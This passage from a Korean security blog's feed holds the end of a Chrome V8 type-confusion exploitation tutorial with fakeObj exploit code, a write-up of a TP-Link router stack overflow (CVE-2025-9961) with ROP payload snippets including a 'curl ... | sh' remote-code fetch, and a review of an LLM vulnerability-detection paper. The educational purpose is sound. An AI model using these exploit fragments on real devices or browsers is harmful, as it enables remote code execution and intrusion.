&#xAC15;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xB294;&#xB370;&#xC694;. &#xD3EC;&#xC778;&#xD130; &#xD0C0;&#xC785;&#xC774; double &#xD0C0;&#xC785;&#xC73C;&#xB85C; Type Confusion &#xC774; &#xB418;&#xC5B4; double&#xC744; &#xC77D;&#xC73C;&#xB824;&#xD588;&#xB294;&#xB370; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C;&#xAC00; &#xC77D;&#xD614;&#xB358; &#xAC83;&#xCC98;&#xB7FC;, double &#xD0C0;&#xC785;&#xC5D0; &#xAC12;&#xC744; &#xC4F0;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370; Type Confusion&#xC73C;&#xB85C; &#xC778;&#xD558;&#xC5EC; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C;&#xC5D0; &#xAC12;&#xC774; &#xC4F0;&#xC5EC;&#xC9C0;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res;        }    }}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; Read primitive &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>let x = addrOf();</code> &#xBD80;&#xBD84;&#xC744; <code>fakeObj()</code> &#xD568;&#xC218;&#xB85C; &#xBCC0;&#xACBD; &#xD6C4; d8&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC2DC;&#xB294; &#xAC83;&#xCC98;&#xB7FC; obj&#xB77C;&#xB294; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C;&#xAC00; 0x41414141&#xB85C; &#xBCC0;&#xACBD;&#xB428;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD558;&#xAC8C; primitive&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294; Type Confusion &#xCC38; &#xB9E4;&#xB825;&#xC801;&#xC774;&#xC9C0; &#xC54A;&#xB098;&#xC694;? &#x314E;&#x314B;</p><p><img src="image%2010.png" alt="image.png"></p><p>&#xC774;&#xC81C; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xB294; read primitive&#xC640; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xB294; write primitive&#xB97C; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8;, &#xC774;&#xB97C; exploit&#xC744; &#xC704;&#xD574; &#xC784;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(AAR/AAW) primitive&#xB85C; &#xC815;&#xAD50;&#xD558;&#xAC8C; &#xB2E4;&#xB4EC;&#xC5B4; &#xBCF4;&#xB824;&#xACE0; &#xD558;&#xC600;&#xC73C;&#xB098;, &#xBD84;&#xB7C9; &#xC870;&#xC808; &#xC2E4;&#xD328;&#xB3C4; &#xC788;&#xACE0; &#xC870;&#xAE08; &#xB354; &#xD004;&#xB9AC;&#xD2F0; &#xC788;&#xB294; &#xAE00;&#xC744; &#xC4F0;&#xACE0; &#xC2F6;&#xC5B4;&#xC11C; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xB85C; &#xB118;&#xAE30;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;..</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD06C;&#xB86C;(&#xB80C;&#xB354;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;)&#xC5D0;&#xC11C;&#xC758; Read/Write primitive&#xAC00; RCE&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACE0; Heap Sandbox&#xAC00; &#xB098;&#xC628; &#xD6C4;&#xC758; &#xB80C;&#xB354;&#xB7EC; RCE&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xBCC0;&#xD654;&#xD588;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! <del>(&#xAC00;&#xB2A5;&#xD558;&#xBA74;..)</del> &#xACE7; &#xB3CC;&#xC544;&#xC62C;&#xAC8C;&#xC694; :)</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://jhalon.github.io/chrome-browser-exploitation-1/">https://jhalon.github.io/chrome-browser-exploitation-1/</a></p><p><a href="https://jhalon.github.io/chrome-browser-exploitation-2/">https://jhalon.github.io/chrome-browser-exploitation-2/</a></p><p><a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/">https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion-101/">Type Confusion 101</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2018-17463/">CVE-2018-17463</category>
      
      
      <comments>https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-9961 : TP-Link AX10, AX1500의 CWMP 바이너리에서 발생한 stack buffer overflow로 인한 임의 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2025/09/24/poosic/cve-2025-9961/</link>
      <guid>https://hackyboiz.github.io/2025/09/24/poosic/cve-2025-9961/</guid>
      <pubDate>Wed, 24 Sep 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.byteray.co.uk/exploiting-zero-day-cve-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://blog.byteray.co.uk/exploiting-zero-day-cve-2025-9961-in-the-tp-link-ax10-router-8745f9af9c46">https://blog.byteray.co.uk/exploiting-zero-day-cve-2025-9961-in-the-tp-link-ax10-router-8745f9af9c46</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TP-Link AX10: Firmware &lt; v1.2.1</li><li>TP-Link AX1500: Firmware &lt; 1.3.12</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-9961&#xB294; TP-Link&#xC758; AX10, AX1500 &#xB77C;&#xC6B0;&#xD130;&#xC758; CWMP &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. CWMP&#xB294; ACS(&#xC790;&#xB3D9; &#xAD6C;&#xC131; &#xC11C;&#xBC84;)&#xC5D0;&#xC11C; SOAP/XML &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBC1B;&#xC544; &#xC7A5;&#xBE44;&#xB97C; &#xC6D0;&#xACA9; &#xAD00;&#xB9AC;&#xD558;&#xB294;&#xB370;, &#xD2B9;&#xC815; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAE38;&#xC774; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD558;&#xC5EC; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>CWMP(CPE WAN Management Protocol)</strong></p><p>TR-069 &#xADDC;&#xC57D;&#xC5D0; &#xB530;&#xB77C; CPE(Consumer-premises Equipment)&#xB97C; &#xC6D0;&#xACA9; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xB77C;&#xC6B0;&#xD130;, &#xBAA8;&#xB380;, &#xC14B;&#xD1B1;&#xBC15;&#xC2A4; &#xB4F1; &#xAC00;&#xC815;&#xC6A9; &#xC7A5;&#xBE44;&#xAC00; ISP&#xC758; ACS &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xD560; &#xB54C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xACF5;&#xAC1C;&#xB41C; PoC&#xC640; Exploit&#xC758; &#xD750;&#xB984;&#xC744; &#xC694;&#xC57D;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCEE4;&#xC2A4;&#xD140; ACS &#xC124;&#xC815;: &#xB9DE;&#xCDA4;&#xD615; ACS &#xC11C;&#xBC84;&#xB97C; &#xAD6C;&#xCD95;&#xD558;&#xACE0;, &#xD0C0;&#xAC9F; &#xC7A5;&#xBE44;&#xAC00; &#xD574;&#xB2F9; &#xC11C;&#xBC84;&#xB97C; &#xC2E0;&#xB8B0;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p>Payload &#xC791;&#xC131;: SOAP/XML request &#xBA54;&#xC2DC;&#xC9C0; &#xC548;&#xC5D0; buffer overflow&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; payload &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; CWMP&#xB85C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. </p> <pre><code class="hljs python"><span class="hljs-comment"># poc.py</span>...stack_buffer_size = <span class="hljs-number">3108</span>rop = ROP(elf)rop.raw(<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">3108</span> + <span class="hljs-string">&quot;XXXX&quot;</span>)payload_array = [    {        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;setParameterValues&quot;</span>,        <span class="hljs-string">&quot;parameterValues&quot;</span>: [            [                <span class="hljs-string">&quot;InternetGatewayDevice.DeviceInfo.ProvisioningCode&quot;</span>,                rop.chain().decode(<span class="hljs-string">&quot;ascii&quot;</span>),                <span class="hljs-string">&quot;xsd:string&quot;</span>,            ]        ],    }]...</code></pre><p> payload&#xB294; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; NX bit &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574; payload&#xB294; ROP &#xCCB4;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span>buf = <span class="hljs-string">b&quot;&quot;</span>buf+= p32(<span class="hljs-number">0xb6d7d730</span>) <span class="hljs-comment"># pop {r0,pc}</span>buf+= p32(<span class="hljs-number">0xb6a88d90</span>) <span class="hljs-comment"># &#xBA85;&#xB839;(command) &#xBB38;&#xC790;&#xC5F4; &#xC704;&#xCE58;</span>buf+= p32(<span class="hljs-number">0xb6ca96c8</span>) <span class="hljs-comment"># system() &#xD568;&#xC218; &#xC8FC;&#xC18C;</span>buf+= <span class="hljs-string">b&quot;curl http://&quot;</span> + LOCAL_IP.encode() + <span class="hljs-string">b&quot;:8000/show | sh&quot;</span></code></pre></li><li><p>Stack Buffer Overflow: CWMP&#xAC00; payload&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xBA74;&#xC11C; &#xAE38;&#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC815;&#xD574;&#xC9C4; &#xC2A4;&#xD0DD; &#xAC12;&#xC744; &#xB118;&#xC5B4; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC4F0;&#xC5EC;&#xC9C0;&#xBA70; &#xC804;&#xB2EC;&#xB41C; payload&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xD0C0;&#xAC9F; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0;&#xB294; NX bit &#xBFD0; &#xC544;&#xB2C8;&#xB77C; ASLR &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC815;&#xD655;&#xD55C; libc base&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACF5;&#xAC1C;&#xD55C; theByteRay&#xB294; ASLR&#xC758; &#xC5D4;&#xD2B8;&#xB85C;&#xD53C;&#xAC00; &#xB0AE;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xC5EC; brute force &#xBC29;&#xC2DD;&#xC73C;&#xB85C; libc base&#xB97C; &#xC720;&#xCD94;&#xD558;&#xC5EC; &#xC6B0;&#xD68C;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC;, cwmp&#xC5D0; payload&#xB97C; &#xC804;&#xB2EC;&#xD560; &#xB54C; &#xC798;&#xBABB;&#xB41C; libc base &#xC8FC;&#xC18C;&#xB97C; &#xC804;&#xB2EC;&#xD560; &#xACBD;&#xC6B0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC885;&#xB8CC;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; CVE-2023-1389 &#xC640; &#xAC19;&#xC740; one-day &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6F9; &#xAD00;&#xB9AC;&#xC790; &#xD398;&#xC774;&#xC9C0; &#xC811;&#xC18D; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC804;&#xC81C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/theByteRay/pub/tree/main/CVE-2025%E2%80%939961">https://github.com/theByteRay/pub/tree/main/CVE-2025%E2%80%939961</a></li><li><a href="https://cybersecuritynews.com/tp-link-router-zero-day-rce-vulnerability/">https://cybersecuritynews.com/tp-link-router-zero-day-rce-vulnerability/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/TP-LINK/">TP-LINK</category>
      
      <category domain="https://hackyboiz.github.io/tags/Router/">Router</category>
      
      <category domain="https://hackyboiz.github.io/tags/ROP/">ROP</category>
      
      <category domain="https://hackyboiz.github.io/tags/BOF/">BOF</category>
      
      <category domain="https://hackyboiz.github.io/tags/Stack/">Stack</category>
      
      <category domain="https://hackyboiz.github.io/tags/cwmp/">cwmp</category>
      
      <category domain="https://hackyboiz.github.io/tags/AX10/">AX10</category>
      
      <category domain="https://hackyboiz.github.io/tags/AX1500/">AX1500</category>
      
      
      <comments>https://hackyboiz.github.io/2025/09/24/poosic/cve-2025-9961/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] “LLMxCPG: Context-Aware Vulnerability Detection Through Code Property Graph-Guided Large Language Models” Paper Review (EN)</title>
      <link>https://hackyboiz.github.io/2025/09/22/l0ch/llmxcpg_paper_review/en/</link>
      <guid>https://hackyboiz.github.io/2025/09/22/l0ch/llmxcpg_paper_review/en/</guid>
      <pubDate>Mon, 22 Sep 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Hello, I&amp;#x2019;m L0ch! Recent</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Hello, I&#x2019;m L0ch! Recently, I&#x2019;ve become interested in Code Property Graphs (CPG) and have been looking into them. In this post, I&#x2019;ll be reviewing the USENIX Security &#x2018;25 paper, &#x201C;LLMxCPG: Context-Aware Vulnerability Detection Through Code Property Graph-Guided Large Language Models.&#x201D;</p><blockquote><p>Original Paper: <a href="https://arxiv.org/pdf/2507.16585">https://arxiv.org/pdf/2507.16585</a></p></blockquote><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>As is the case in many fields, LLMs are being widely used in vulnerability detection these days. I also use LLMs frequently when analyzing 1-day vulnerabilities or searching for zero-days.</p><p>However, I&#x2019;ve often experienced issues where analysis fails on large codebases, or the context size is exceeded, requiring manual intervention. Of course, modern large-scale models like Gemini and GPT have significantly larger context windows than before, but smaller embedding models for fine-tuning or training are still limited by their context window size because supporting hardware performance can be a challenge (~~underpowered GPUs~~).</p><p>A problem with existing LLM-based vulnerability detection approaches is that the code relevant to the actual vulnerability often makes up only a small portion of the entire code segment being analyzed by the LLM. In other words, irrelevant code constitutes the majority of the segment. This leads to several problems, such as increased token usage and the model relying on irrelevant code patterns.</p><p>The paper I&#x2019;m reviewing today introduces a CPG-based code slicing technique to address these issues and overcome the limitations of LLMs in analyzing large codebases.</p><blockquote><p><strong>Code Property Graphs (CPG):</strong> A method that combines various code representations, such as the Abstract Syntax Tree (AST), Control Flow Graph (CFG), and Program Dependence Graph (PDG), into a single graph.</p></blockquote><h1 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h1><h2 id="0-System-Overview"><a href="#0-System-Overview" class="headerlink" title="0. System Overview"></a>0. System Overview</h2><p>The figure below provides an overview of the system proposed in the paper, which uses the code representation provided by CPG to slice and reduce the code related to a vulnerability to determine its existence.<br><img src="image.png" alt="image.png"></p><p>It consists of three main stages: Query Generation, Slice Construction, and Code Classification.</p><h2 id="1-Query-Generation"><a href="#1-Query-Generation" class="headerlink" title="1. Query Generation"></a>1. Query Generation</h2><p><img src="image%201.png" alt="image.png"></p><p>The <code>LLMxCPG-Q</code> model is a fine-tuned version of <code>Qwen2.5-Coder-32B Instruct</code>, as shown in the figure. It takes the code to be analyzed as input and generates the CPGQL queries that will be described later. This trained model is used to automate query generation for extracting key code segments related to vulnerabilities and for the overall code slicing process.</p><h2 id="2-Slice-Construction"><a href="#2-Slice-Construction" class="headerlink" title="2. Slice Construction"></a>2. Slice Construction</h2><p>The CPGQL query generated in step 1 is processed by <a href="https://github.com/joernio/joern">Joern</a>. Joern is an open-source SAST tool that generates CPGs and supports querying them with the Scala-based CPGQL.</p><p>Based on Joern and the CPGQL queries, a code slice is constructed through the following three steps:</p><ol><li>Identify the potential root cause of the vulnerability in the code, focusing on the execution path.</li><li>Identify variables that interact with the execution path.</li><li>Find all code elements that affect steps 1 and 2 to construct the final slice.</li></ol><h3 id="2-1-Extracting-the-Taint-Path"><a href="#2-1-Extracting-the-Taint-Path" class="headerlink" title="2-1) Extracting the Taint Path"></a>2-1) Extracting the Taint Path</h3><p>The example vulnerability used is <a href="https://github.com/torvalds/linux/commit/c85ce65ecac078ab1a1835c87c4a6319cf74660a">CVE-2011-3359</a>.</p><ul><li>A buffer overflow vulnerability caused by insufficient validation of the buffer length <code>len</code>.</li><li>The overflow is triggered during the copy process of length <code>len</code> when the <code>skb_put</code> function is called.</li></ul><!-- end list --><pre><code class="hljs graphql">val source = cpg.identifier.name(&quot;len&quot;)val sink = cpg.call.name(&quot;skb_put&quot;).where(_.argument.order(2).codeExact(&quot;len + ring-&gt;frameoffset&quot;))val execution_paths = sink.reachableByFlows(source)</code></pre><p>The CPGQL query above extracts the vulnerability&#x2019;s Taint Path, including the <strong>source</strong> (variable <code>len</code>), <strong>sink</strong> (<code>skb_put</code> call), and <strong>execution paths</strong>.</p><h3 id="2-2-Extracting-Variables-Interacting-with-the-Execution-Path"><a href="#2-2-Extracting-Variables-Interacting-with-the-Execution-Path" class="headerlink" title="2-2) Extracting Variables Interacting with the Execution Path"></a>2-2) Extracting Variables Interacting with the Execution Path</h3><pre><code class="hljs graphql">val execution_path_nodes = &lt;Query to extract execution path (generated by LLMxCPG-Q)&gt;cpg.identifier.filter(id =&gt; execution_path_nodes.lineNumber.toSet.intersect(id.lineNumber.l.toSet).size.equals(1))</code></pre><p>It searches for nodes that interact with <code>execution_path_nodes</code> using a CPGQL query.</p><h3 id="2-3-Backward-Slicing-and-Final-Code-Snippet-Construction"><a href="#2-3-Backward-Slicing-and-Final-Code-Snippet-Construction" class="headerlink" title="2-3) Backward Slicing and Final Code Snippet Construction"></a>2-3) Backward Slicing and Final Code Snippet Construction</h3><pre><code class="hljs graphql"># Query to extract execution paths and interactionsexecution_path_and_interacters.reachableByFlows(cpg.all)</code></pre><p>In this stage, a <strong>backward slice</strong> is constructed using Joern&#x2019;s <code>reachableByFlows</code> API, which internally uses a Program Dependency Graph (PDG).</p><p>The backward slice retrieves all contexts related to the vulnerability&#x2019;s interactions and execution path, such as loops, variable declarations, and initializations.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dma_rx</span><span class="hljs-params">(struct b43_dmaring *ring, <span class="hljs-keyword">int</span> *slot)</span></span><span class="hljs-function"></span>{    u16 len;    len = le16_to_cpu(rxhdr-&gt;frame_len);    <span class="hljs-keyword">if</span> (unlikely(len &gt; ring-&gt;rx_buffersize)) {        s32 tmp = len;        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {            tmp -= ring-&gt;rx_buffersize;            <span class="hljs-keyword">if</span> (tmp &lt;= <span class="hljs-number">0</span>)                <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">goto</span> drop;    }    skb_put(skb, len + ring-&gt;frameoffset);    drop:    <span class="hljs-keyword">return</span>;}</code></pre><p>As a result of slicing, the original 85-line <code>dma_rx()</code> function was compressed into an 18-line code snippet that is semantically consistent with the execution path of the CVE-2011-3359 vulnerability.</p><h2 id="3-Code-Classification-Vulnerability-Detection"><a href="#3-Code-Classification-Vulnerability-Detection" class="headerlink" title="3. Code Classification (Vulnerability Detection)"></a>3. Code Classification (Vulnerability Detection)</h2><p><img src="image%202.png" alt="image.png"></p><p>The code, compressed through slicing, is then binary classified as either <strong>Vuln</strong> or <strong>Safe</strong> by the <code>LLMxCPG-D</code> model, which is a fine-tuned version of the <code>QwQ-32B-Preview</code> model. <code>LLMxCPG-D</code> is fine-tuned on a dataset of sliced and labeled code snippets from both vulnerable and non-vulnerable code to improve classification accuracy.</p><p>This approach is not only useful for vulnerability detection but can also identify and highlight vulnerability patch code in patched versions. This can be utilized to automate the creation of datasets for future model training.</p><h1 id="Performance-Analysis"><a href="#Performance-Analysis" class="headerlink" title="Performance Analysis"></a>Performance Analysis</h1><p>The implemented system was evaluated on six main points. The results for each are as follows (for detailed figures and comparison tables, please refer to the original paper).</p><h3 id="Query-Generation"><a href="#Query-Generation" class="headerlink" title="Query Generation"></a>Query Generation</h3><ul><li>Successfully learned CPGQL by generating valid queries for all 1278 test samples.</li><li>A human audit of 50 samples showed that in 76% of them, the sliced code was semantically consistent with the intended vulnerability.</li><li>Analysis of 25 misclassified samples:<ul><li>28% were semantically correct queries but were misclassified by LLMxCPG-D.</li><li>40% resulted from incorrect CWE derivation.</li><li>32% correctly identified the CWE but failed to retrieve key context elements.</li></ul></li></ul><h3 id="Code-Reduction"><a href="#Code-Reduction" class="headerlink" title="Code Reduction"></a>Code Reduction</h3><ul><li>Achieved code reduction rates ranging from a minimum of 67.87% to a maximum of 90.93% across various datasets.</li></ul><h3 id="Function-level-Vulnerability-Detection"><a href="#Function-level-Vulnerability-Detection" class="headerlink" title="Function-level Vulnerability Detection"></a>Function-level Vulnerability Detection</h3><ul><li><p>Demonstrated high performance, especially in function-level vulnerability detection.</p></li><li><p>Showed high detection rates for specific memory corruption bug types (<a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a>, <a href="https://cwe.mitre.org/data/definitions/415.html">CWE-415</a>, <a href="https://cwe.mitre.org/data/definitions/416.html">CWE-416</a>, <a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190</a>).</p><p>  <img src="image%203.png" alt="image.png"></p></li></ul><h3 id="Generalizability"><a href="#Generalizability" class="headerlink" title="Generalizability"></a>Generalizability</h3><ul><li>At the function level, generalizability improved accuracy by 20% compared to existing models like VulSim, VulBERTA-CNN, VulBERTA-MLP, and ReGVD.</li><li>At the project level, it maintained consistent performance without degradation despite increased complexity.</li><li>The model also showed respectable generalization performance on new vulnerability patterns appearing after its knowledge cutoff, confirming that it learned the fundamental characteristics of vulnerabilities, not just known CVEs.</li></ul><h3 id="Misclassification-Analysis"><a href="#Misclassification-Analysis" class="headerlink" title="Misclassification Analysis"></a>Misclassification Analysis</h3><ul><li>Performance degradation was observed for CWE-120 (Classic Buffer Overflow) and CWE-125 (Out-of-bounds Read).<ul><li>This was attributed to a limited number of samples for these CWEs in the training dataset and can be resolved with a higher-quality dataset.</li></ul></li></ul><h3 id="Robustness-to-Code-Augmentation"><a href="#Robustness-to-Code-Augmentation" class="headerlink" title="Robustness to Code Augmentation"></a>Robustness to Code Augmentation</h3><ul><li>Showed high performance in preserving semantics against noise (comment impact, dataset dependency, code transformation noise).</li><li>However, the T3 transformation (function extraction) significantly impacted the model&#x2019;s performance, particularly its recall, indicating the model is somewhat sensitive to T3 transformations.<ul><li>Function extraction involves transformations like splitting a function&#x2019;s code into a new function or merging the code of multiple functions into one.</li><li>When such transformations occur, the very structure of function calls, data flow, or relationships with other functions within the CPG is reorganized, which is why it impacts the model&#x2019;s performance more significantly than other transformations.</li></ul></li></ul><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In summary, <strong>LLMxCPG</strong> optimizes the code context by filtering out unnecessary code through CPG-based code slicing. This optimization enhances the learning efficiency of the LLM and helps overcome the limitations of existing models. Notably, it maintains semantic consistency even with code transformations and significantly improves generalization performance on complex codebases.</p><h1 id="Closing-Thoughts"><a href="#Closing-Thoughts" class="headerlink" title="Closing Thoughts"></a>Closing Thoughts</h1><p>As the authors mention in the Limitations section, it is difficult to 